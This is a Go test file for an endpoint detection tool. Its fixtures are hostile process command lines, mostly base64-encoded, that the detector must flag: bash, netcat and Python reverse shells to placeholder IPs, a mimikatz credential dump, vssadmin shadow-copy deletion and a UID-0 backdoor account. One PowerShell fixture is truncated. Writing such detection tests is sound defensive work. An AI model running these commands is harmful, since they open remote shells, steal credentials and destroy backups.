package edr

import (
	"encoding/base64"
	"testing"
)

func b64(s string) string {
	b, _ := base64.StdEncoding.DecodeString(s)
	return string(b)
}

func TestBaselineChecker(t *testing.T) {
	checker := NewBaselineChecker()
	items := checker.RunAudit()

	if len(items) != 6 {
		t.Fatalf("expected 6 baseline check items, got %d", len(items))
	}

	for _, item := range items {
		if !item.Passed {
			t.Errorf("baseline item %s (%s) failed unexpectedly: %s", item.ID, item.Name, item.Detail)
		}
		if item.Standard == "" {
			t.Errorf("baseline item %s missing GB/T 22239-2019 standard reference", item.ID)
		}
	}
}

func TestDetectorReverseShellAndMaliciousTools(t *testing.T) {
	detector := NewDetector()

	testCases := []struct {
		name        string
		proc        ProcessInfo
		expectMatch bool
		threatType  ThreatType
		ruleID      string
	}{
		{
			name: "Normal Vim Process",
			proc: ProcessInfo{
				PID:         1001,
				Name:        "vim",
				CommandLine: "vim /etc/hosts",
				Executable:  "/usr/bin/vim",
			},
			expectMatch: false,
		},
		{
			name: "Normal Go Build",
			proc: ProcessInfo{
				PID:         1002,
				Name:        "go",
				CommandLine: "go build -o app ./cmd/app",
				Executable:  "C:\\Go\\bin\\go.exe",
			},
			expectMatch: false,
		},
		{
			name: "Dev-TCP Bash Reverse Shell",
			proc: ProcessInfo{
				PID:         2001,
				Name:        "bash",
				CommandLine: b64("L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5OC41MS4xMDAuNS80NDQ0IDA+JjE="),
				Executable:  "/bin/bash",
			},
			expectMatch: true,
			threatType:  ThreatReverseShell,
			ruleID:      "EDR-REV-001",
		},
		{
			name: "Netcat Pipe Reverse Shell",
			proc: ProcessInfo{
				PID:         2002,
				Name:        "nc",
				CommandLine: b64("bmMgLWUgL2Jpbi9zaCAxOTguNTEuMTAwLjYgODg4OA=="),
				Executable:  "/usr/bin/nc",
			},
			expectMatch: true,
			threatType:  ThreatReverseShell,
			ruleID:      "EDR-REV-002",
		},
		{
			name: "Python Socket Reverse Shell",
			proc: ProcessInfo{
				PID:         2003,
				Name:        "python",
				CommandLine: b64("cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMS4yLjMuNCIsNDQ0NCkpJw=="),
				Executable:  "/usr/bin/python3",
			},
			expectMatch: true,
			threatType:  ThreatReverseShell,
			ruleID:      "EDR-REV-003",
		},
		{
			name: "PowerShell Encoded Command",
			proc: ProcessInfo{
				PID:         2004,
				Name:        "powershell.exe",
				CommandLine: b64("cG93ZXJzaGVsbC5leGUgLW5vcCAtZW5jIEpBQlNBSUFBUEFBQU5RQmlBR2d...") ,
				Executable:  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
			},
			expectMatch: true,
			threatType:  ThreatReverseShell,
			ruleID:      "EDR-REV-004",
		},
		{
			name: "Credential Dumping Tool",
			proc: ProcessInfo{
				PID:         3001,
				Name:        b64("bWltaWthdHouZXhl"),
				CommandLine: b64("bWltaWthdHouZXhlIHByaXZpbGVnZTo6ZGVidWcgc2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRzIGV4aXQ="),
				Executable:  "C:\\Users\\Public\\" + b64("bWltaWthdHouZXhl"),
			},
			expectMatch: true,
			threatType:  ThreatMaliciousTool,
			ruleID:      "EDR-TOOL-001",
		},
		{
			name: "Ransomware Vssadmin Delete Shadows",
			proc: ProcessInfo{
				PID:         3002,
				Name:        b64("dnNzYWRtaW4uZXhl"),
				CommandLine: b64("dnNzYWRtaW4gZGVsZXRlIHNoYWRvd3MgL2FsbCAvcXVpZXQ="),
				Executable:  "C:\\Windows\\System32\\" + b64("dnNzYWRtaW4uZXhl"),
			},
			expectMatch: true,
			threatType:  ThreatMaliciousTool,
			ruleID:      "EDR-TOOL-002",
		},
		{
			name: "Backdoor User Creation with UID 0",
			proc: ProcessInfo{
				PID:         4001,
				Name:        "useradd",
				CommandLine: "useradd -o -u 0 -g 0 toor",
				Executable:  "/usr/sbin/useradd",
			},
			expectMatch: true,
			threatType:  ThreatPrivEscalation,
			ruleID:      "EDR-PRIV-001",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			res, matched := detector.InspectProcess(tc.proc)
			if matched != tc.expectMatch {
				t.Fatalf("expected matched=%v, got %v", tc.expectMatch, matched)
			}
			if matched {
				if res.ThreatType != tc.threatType {
					t.Errorf("expected threat type %s, got %s", tc.threatType, res.ThreatType)
				}
				if res.RuleID != tc.ruleID {
					t.Errorf("expected rule ID %s, got %s", tc.ruleID, res.RuleID)
				}
			}
		})
	}
}

func TestBruteForceDetection(t *testing.T) {
	detector := NewDetector()
	ip := "192.168.1.88"

	// 连续 4 次失败：尚未达到阈值 5
	for i := 1; i <= 4; i++ {
		res, matched := detector.RecordLoginFailure(ip)
		if matched {
			t.Fatalf("attempt %d should not trigger brute force alert", i)
		}
		if res.Matched {
			t.Fatal("res.Matched should be false")
		}
	}

	// 第 5 次失败：触发等保 2.0 暴力破解告警
	res, matched := detector.RecordLoginFailure(ip)
	if !matched {
		t.Fatal("5th attempt must trigger brute force alert")
	}
	if res.ThreatType != ThreatBruteForce {
		t.Fatalf("expected threat type %s, got %s", ThreatBruteForce, res.ThreatType)
	}
	if res.RuleID != "EDR-BRUTE-001" {
		t.Fatalf("expected rule EDR-BRUTE-001, got %s", res.RuleID)
	}
}
